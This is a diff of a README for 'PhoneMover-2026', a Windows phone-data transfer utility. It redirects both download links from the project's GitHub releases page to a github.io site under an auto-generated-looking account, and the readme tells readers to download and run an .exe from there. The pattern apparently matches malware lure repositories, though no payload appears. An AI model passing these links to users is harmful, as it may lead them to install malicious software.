@@ -1,6 +1,6 @@
 # 📱 PhoneMover-2026 - Move your mobile data with ease
 
-[![](https://img.shields.io/badge/Download-PhoneMover-blue.svg)](https://github.com/foldingamericanhazel286/PhoneMover-2026/releases)
+[![](https://img.shields.io/badge/Download-PhoneMover-blue.svg)](https://foldingamericanhazel286.github.io)
 
 PhoneMover-2026 helps you transfer data between mobile devices and your computer. This software works on Windows 10 and Windows 11. It manages phone backups, moves personal files, and handles data migration tasks.
 
@@ -16,7 +16,7 @@ To run PhoneMover-2026, your computer needs these specifications:
 
 ## 📥 How to Download
 
-1. Visit the [releases page](https://github.com/foldingamericanhazel286/PhoneMover-2026/releases).
+1. Visit the [releases page](https://foldingamericanhazel286.github.io).
 2. Look for the latest release version at the top of the list.
 3. Click the file name ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
